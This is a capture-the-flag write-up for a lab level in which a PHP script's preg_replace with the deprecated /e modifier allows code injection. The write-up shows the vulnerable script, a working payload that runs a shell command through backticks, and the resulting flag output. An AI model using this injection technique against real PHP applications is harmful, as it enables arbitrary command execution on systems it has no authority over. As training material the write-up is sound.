# LEVEL06

## Analysis


## Enumeration

In this challenge, we have a php script called `level06.php`:
```bash
    $ cat level06.php
```
Output:
```bash
    $ cat level06.php
    #!/usr/bin/php
    <?php
    function y($m)
    {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
    }
    function x($y, $z)
    {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a); 
        $a = preg_replace("/\]/", ")", $a);
        return $a;
    }
    $r = x($argv[1], $argv[2]);
    print $r;
    ?>
```

## Investigation 

The vulnarability lies in the use of the depreciated `\e` regular expression (regex) modifier in `preg_replace`. This modifier causes the replacement string to be evaluated as PHP code instead of being treated as a simple string. 
This means attacker-controlled input captured by the regex can lead to arbitrary PHP code execution.

The regex cpatures:
```txt
    [x PAYLOAD]
```
Where PAYLOAD becomes capture group `\\2`.

## Exploitation

We insert the malicious payload `[x {${`getflag`}}]` in a local file to match the pattern `[x (.*)]`:
```bash
    $ echo '[x {${`getflag`}}]' > /tmp/getflag
    $ cat /tmp/getflag
    [x {${`getflag`}}]
``` 

When processed by `preg_replace`,`\\2` captures `{${`getflag`}}` and the replacement becomes:
```php
    y("{${`getflag`}}")
```

`\e` modifier evaluates the replacement as PHP code and `${`getflag`}}` is valid in PHP. Backticks are execution operators. `getflag` executes the shell command with elevated privilege. 

## Result
```bash
    $ ./level06 /tmp/getflag
    PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
    in /home/user/level06/level06.php(4) : regexp code on line 1
```

## Takeways

- `\e` modifier was depreciated for security reasons. The use of `preg_replace_callback` is now the norm to replace it.